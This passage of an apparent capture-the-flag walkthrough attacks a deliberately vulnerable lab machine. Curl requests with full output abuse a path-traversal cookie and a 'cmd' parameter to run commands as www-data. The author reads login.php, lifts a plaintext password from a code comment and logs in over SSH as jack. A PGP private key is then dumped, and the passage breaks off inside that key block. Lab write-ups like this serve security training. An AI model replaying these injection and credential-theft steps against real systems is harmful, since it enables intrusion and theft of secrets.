+</span><span class='line'>* About to connect() to 10.10.10.146 port 80 (#0)
+</span><span class='line'>*   Trying 10.10.10.146...
+</span><span class='line'>* connected
+</span><span class='line'>* Connected to 10.10.10.146 (10.10.10.146) port 80 (#0)
+</span><span class='line'>&gt; GET /super_secret_login_path_muhahaha/panel.php?cmd=id HTTP/1.1
+</span><span class='line'>&gt; User-Agent: curl/7.26.0
+</span><span class='line'>&gt; Host: 10.10.10.146
+</span><span class='line'>&gt; Accept: */*
+</span><span class='line'>&gt; Cookie: intruder=....//....//....//....//....//....//tmp//note.txt; failcount=3; PHPSESSID=cb11eurq57no9kbu8k09pvt0d5
+</span><span class='line'>&gt;
+</span><span class='line'>* additional stuff not fine transfer.c:1037: 0 0
+</span><span class='line'>* HTTP 1.1 or later with persistent connection, pipelining supported
+</span><span class='line'><span class="nt">&lt; HTTP</span><span class="err">/</span><span class="na">1</span><span class="err">.</span><span class="na">1</span> <span class="na">302</span> <span class="na">Found</span>
+</span><span class='line'><span class="err">&lt;</span> <span class="na">Date:</span> <span class="na">Wed</span><span class="err">,</span> <span class="na">15</span> <span class="na">Jul</span> <span class="na">2015</span> <span class="na">00:16:47</span> <span class="na">GMT</span>
+</span><span class='line'><span class="err">&lt;</span> <span class="na">Server:</span> <span class="na">Apache</span><span class="err">/</span><span class="na">2</span><span class="err">.</span><span class="na">2</span><span class="err">.</span><span class="na">22</span> <span class="err">(</span><span class="na">Debian</span><span class="err">)</span>
+</span><span class='line'><span class="err">&lt;</span> <span class="na">X-Powered-By:</span> <span class="na">PHP</span><span class="err">/</span><span class="na">5</span><span class="err">.</span><span class="na">4</span><span class="err">.</span><span class="na">4-14</span><span class="err">+</span><span class="na">deb7u11</span>
+</span><span class='line'><span class="err">&lt;</span> <span class="na">Expires:</span> <span class="na">Thu</span><span class="err">,</span> <span class="na">19</span> <span class="na">Nov</span> <span class="na">1981</span> <span class="na">08:52:00</span> <span class="na">GMT</span>
+</span><span class='line'><span class="err">&lt;</span> <span class="na">Cache-Control:</span> <span class="na">no-store</span><span class="err">,</span> <span class="na">no-cache</span><span class="err">,</span> <span class="na">must-revalidate</span><span class="err">,</span> <span class="na">post-check=</span><span class="s">0,</span> <span class="na">pre-check=</span><span class="s">0</span>
+</span><span class='line'><span class="err">&lt;</span> <span class="na">Pragma:</span> <span class="na">no-cache</span>
+</span><span class='line'><span class="err">&lt;</span> <span class="na">Location:</span> <span class="na">index</span><span class="err">.</span><span class="na">php</span>
+</span><span class='line'><span class="err">&lt;</span> <span class="na">Vary:</span> <span class="na">Accept-Encoding</span>
+</span><span class='line'><span class="err">&lt;</span> <span class="na">Content-Length:</span> <span class="na">620</span>
+</span><span class='line'><span class="err">&lt;</span> <span class="na">Content-Type:</span> <span class="na">text</span><span class="err">/</span><span class="na">html</span>
+</span><span class='line'><span class="err">&lt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="err">&lt;</span><span class="na">HTML</span><span class="nt">&gt;</span>
+</span><span class='line'><span class="nt">&lt;CENTRE&gt;</span>
+</span><span class='line'><span class="nt">&lt;H2&gt;</span> Folders <span class="nt">&lt;/H2&gt;</span>
+</span><span class='line'><span class="nt">&lt;TABLE</span> <span class="na">style=</span><span class="s">&quot;width:700px&quot;</span> <span class="na">align=</span><span class="s">&quot;center&quot;</span><span class="nt">&gt;</span>
+</span><span class='line'><span class="nt">&lt;TR&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;server.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;mail.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;users.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;personal.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;notes.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
+</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
+</span><span class='line'><span class="nt">&lt;TR&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Server Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Mail Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Auth Users<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Personal Folder<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Notes<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
+</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
+</span><span class='line'><span class="nt">&lt;/CENTRE&gt;</span>
+</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class='line'><span class="nt">&lt;/HTML&gt;</span>
+</span><span class='line'>* Connection #0 to host 10.10.10.146 left intact
+</span><span class='line'>* Closing connection #0
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# curl http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=ls+-l+/home -c cookies -b cookies
+</span><span class='line'>
+</span><span class='line'><span class="nt">&lt;HTML&gt;</span>
+</span><span class='line'><span class="nt">&lt;CENTRE&gt;</span>
+</span><span class='line'><span class="nt">&lt;H2&gt;</span> Folders <span class="nt">&lt;/H2&gt;</span>
+</span><span class='line'><span class="nt">&lt;TABLE</span> <span class="na">style=</span><span class="s">&quot;width:700px&quot;</span> <span class="na">align=</span><span class="s">&quot;center&quot;</span><span class="nt">&gt;</span>
+</span><span class='line'><span class="nt">&lt;TR&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;server.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;mail.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;users.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;personal.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;notes.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
+</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
+</span><span class='line'><span class="nt">&lt;TR&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Server Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Mail Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Auth Users<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Personal Folder<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Notes<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
+</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
+</span><span class='line'><span class="nt">&lt;/CENTRE&gt;</span>
+</span><span class='line'>total 20
+</span><span class='line'>drwx------ 3 bazza       bazza       4096 Jul 13 01:43 bazza
+</span><span class='line'>drwx--x--x 3 george      george      4096 Jul 12 07:27 george
+</span><span class='line'>drwx------ 5 jack        jack        4096 Jul 12 05:28 jack
+</span><span class='line'>drwx------ 2 milk_4_life milk_4_life 4096 Jul 12 06:59 milk_4_life
+</span><span class='line'>drwx------ 2 oj          oj          4096 Jul 14 01:49 oj
+</span><span class='line'><span class="nt">&lt;/HTML&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here we can see there are 5 users under folder <code>/home</code>: <strong>bazza</strong>, <strong>george</strong>, <strong>jack</strong>, <strong>milk_4_life</strong> and <strong>oj</strong></p>
+
+<h2>Moving to <strong>jack</strong></h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# curl http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=ls+-l+/var/www/ -c cookies -b cookies
+</span><span class='line'>
+</span><span class='line'><span class="nt">&lt;HTML&gt;</span>
+</span><span class='line'><span class="nt">&lt;CENTRE&gt;</span>
+</span><span class='line'><span class="nt">&lt;H2&gt;</span> Folders <span class="nt">&lt;/H2&gt;</span>
+</span><span class='line'><span class="nt">&lt;TABLE</span> <span class="na">style=</span><span class="s">&quot;width:700px&quot;</span> <span class="na">align=</span><span class="s">&quot;center&quot;</span><span class="nt">&gt;</span>
+</span><span class='line'><span class="nt">&lt;TR&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;server.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;mail.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;users.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;personal.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;notes.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
+</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
+</span><span class='line'><span class="nt">&lt;TR&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Server Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Mail Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Auth Users<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Personal Folder<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Notes<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
+</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
+</span><span class='line'><span class="nt">&lt;/CENTRE&gt;</span>
+</span><span class='line'>total 112
+</span><span class='line'>-rw-r--r-- 1 www-data www-data 87841 Jun 17  2014 comic.png
+</span><span class='line'>-rwxr--r-- 1 www-data www-data  7846 Jun 20  2014 echoserver.bak
+</span><span class='line'>-rw-r--r-- 1 www-data www-data   466 Jun 20  2014 index.html
+</span><span class='line'>drwxr-xr-x 2 www-data www-data  4096 Jun 20  2014 personal
+</span><span class='line'>-rw-r--r-- 1 www-data www-data    80 Jun 17  2014 robots.txt
+</span><span class='line'>drwxr-xr-x 2 www-data www-data  4096 Jul 13 05:32 super_secret_login_path_muhahaha
+</span><span class='line'><span class="nt">&lt;/HTML&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here I found some sensitive information in <code>login.php</code> file.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# curl http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=cat+login.php -c cookies -b cookies
+</span><span class='line'>
+</span><span class='line'><span class="nt">&lt;HTML&gt;</span>
+</span><span class='line'><span class="nt">&lt;CENTRE&gt;</span>
+</span><span class='line'><span class="nt">&lt;H2&gt;</span> Folders <span class="nt">&lt;/H2&gt;</span>
+</span><span class='line'><span class="nt">&lt;TABLE</span> <span class="na">style=</span><span class="s">&quot;width:700px&quot;</span> <span class="na">align=</span><span class="s">&quot;center&quot;</span><span class="nt">&gt;</span>
+</span><span class='line'><span class="nt">&lt;TR&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;server.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;mail.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;users.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;personal.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;notes.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
+</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
+</span><span class='line'><span class="nt">&lt;TR&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Server Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Mail Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Auth Users<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Personal Folder<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Notes<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
+</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
+</span><span class='line'><span class="nt">&lt;/CENTRE&gt;</span>
+</span><span class='line'><span class="cp">&lt;?PHP</span>
+</span><span class='line'><span class="cp">session_start();</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">function login(){</span>
+</span><span class='line'><span class="cp"> </span>
+</span><span class='line'><span class="cp"> $username = mysql_escape_string($_POST[&quot;username&quot;]);</span>
+</span><span class='line'><span class="cp"> $password = mysql_escape_string($_POST[&quot;password&quot;]);</span>
+</span><span class='line'><span class="cp"> // mysql_connect(&quot;127.0.0.1&quot;, &quot;Jack&quot;, &quot;zgcR6mU6pX&quot;) or die (&quot;Server Error&quot;); I&#39;ll change this back once development is done. Got sick of typing my password.  </span>
+</span><span class='line'><span class="cp"> mysql_connect(&quot;127.0.0.1&quot;, &quot;www-data&quot;, &quot;website&quot;) or die(&quot;Server Error&quot;);</span>
+</span><span class='line'><span class="cp"> mysql_select_db(&quot;website&quot;) or die(&quot;Server Error&quot;);</span>
+</span><span class='line'><span class="cp"> $sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;</span>
+</span><span class='line'><span class="cp"> $res = mysql_query($sql) or die(&quot;Server Error&quot;);</span>
+</span><span class='line'><span class="cp"> $row = mysql_fetch_row($res);</span>
+</span><span class='line'><span class="cp"> if ($row[0]) {</span>
+</span><span class='line'><span class="cp">     return 1;</span>
+</span><span class='line'><span class="cp"> } else {</span>
+</span><span class='line'><span class="cp">     return 0;</span>
+</span><span class='line'><span class="cp"> }</span>
+</span><span class='line'><span class="cp">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">if (login()) {</span>
+</span><span class='line'><span class="cp"> $_SESSION[&quot;valid&quot;] = 1;</span>
+</span><span class='line'><span class="cp"> setcookie(time()+600);</span>
+</span><span class='line'><span class="cp"> header(&#39;Location: index.php&#39;);</span>
+</span><span class='line'><span class="cp">} else {</span>
+</span><span class='line'><span class="cp"> header(&#39;Location: index.php?the_user_is_a_failure=1&#39;);</span>
+</span><span class='line'><span class="cp">}</span>
+</span><span class='line'><span class="cp">?&gt;</span>
+</span><span class='line'><span class="nt">&lt;/HTML&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>From the comment, I got credential: <em><font color="red">jack</font> / <font color="red">zgcR6mU6pX</font></em>
+I also got mysql&rsquo;s login credential is <em><font color="red">www-data</font> / <font color="red">website</font></em></p>
+
+<p>Trying SSH login as jack with discovered password and it works! Now I am jack.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~# ssh jack@10.10.10.146
+</span><span class='line'>jack@10.10.10.146&#39;s password:
+</span><span class='line'>Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686
+</span><span class='line'>
+</span><span class='line'>The programs included with the Debian GNU/Linux system are free software;
+</span><span class='line'>the exact distribution terms for each program are described in the
+</span><span class='line'>individual files in /usr/share/doc/*/copyright.
+</span><span class='line'>
+</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span><span class='line'>permitted by applicable law.
+</span><span class='line'>No mail.
+</span><span class='line'>Last login: Sun Jul 12 05:12:42 2015 from 10.10.10.131
+</span><span class='line'>$ id
+</span><span class='line'>uid=1001(jack) gid=1001(jack) groups=1001(jack)
+</span><span class='line'>$ pwd
+</span><span class='line'>/home/jack
+</span><span class='line'>$ ls -l
+</span><span class='line'>total 4
+</span><span class='line'>drwx------ 2 jack jack 4096 Jun 18  2014 g0tmi1k_pics
+</span><span class='line'>$ ls -l g0tmi1k_pics
+</span><span class='line'>total 284
+</span><span class='line'>-rwx------ 1 jack jack 180289 Dec  1  2010 1.jpg
+</span><span class='line'>-rwx------ 1 jack jack  29494 Sep 12  2013 2.jpg
+</span><span class='line'>-rwx------ 1 jack jack  72070 Jun 18  2014 3.jpg
+</span><span class='line'>$ ls -lah
+</span><span class='line'>total 32K
+</span><span class='line'>drwx------ 5 jack jack 4.0K Jul 12 05:28 .
+</span><span class='line'>drwxr-xr-x 7 root root 4.0K Jul  5  2014 ..
+</span><span class='line'>-rwx------ 1 jack jack    1 Jun 22  2014 .bash_logout
+</span><span class='line'>-rwx------ 1 jack jack 3.4K Jun 18  2014 .bashrc
+</span><span class='line'>drwx------ 2 jack jack 4.0K Jun 18  2014 g0tmi1k_pics
+</span><span class='line'>drwx------ 2 jack jack 4.0K Jul 12 05:30 .gnupg
+</span><span class='line'>drwx------ 2 jack jack 4.0K Jun 18  2014 .pgp
+</span><span class='line'>-rwx------ 1 jack jack  675 Jan  1  2013 .profile
+</span><span class='line'>$ cd .pgp
+</span><span class='line'>$ ls -lah
+</span><span class='line'>total 20K
+</span><span class='line'>drwx------ 2 jack jack 4.0K Jun 18  2014 .
+</span><span class='line'>drwx------ 5 jack jack 4.0K Jul 12 05:28 ..
+</span><span class='line'>-rwx------ 1 jack jack   39 Jun 18  2014 note
+</span><span class='line'>-rwx------ 1 jack jack 1.8K Jun 18  2014 pgp.priv
+</span><span class='line'>-rwx------ 1 jack jack  890 Jun 18  2014 pgp.pub
+</span><span class='line'>$ cat note
+</span><span class='line'>The usual password as with everything.
+</span><span class='line'>$ cat pgp.priv
+</span><span class='line'>-----BEGIN PGP PRIVATE KEY BLOCK-----
+</span><span class='line'>Version: BCPG C# v1.6.1.0
+</span><span class='line'>
+</span><span class='line'>lQOsBFOg9v8BCACbr++BXlL9e4N6pzcrHkNZGANB7Ii3vHc0Nj37kCm7ZuTMx4LN
+</span><span class='line'>bpWrqGb9W9grS9YQ7xSEkBShaKlWMilb4rqrM/tmDyuGt9UozCrVrCTfaZdPl72o
+</span><span class='line'>u1QO1DxTT9/iFwlb6AAjTvJGQQx92PQeShEOeTtycH+Xz4tx1ezHpbA4HK9ijftR
+</span><span class='line'>lyZy+y9GPSqYLsIU3N8WtnrTJRfSMiU/AGv/GWpykp3tlHjIL0YSHfvUppe4xAil
+</span><span class='line'>54J+LN7se3jKuFcRM+i9TF08hsTtM6azl7X4yyEDhHcvWgFY/vyggEwe6/ZP1IKG
+</span><span class='line'>zzAWi0sx7tlZLxyr9AFSXLwLvbhUpR3M5rJBABEBAAH/AwMC8ht700SVD+1guMSO
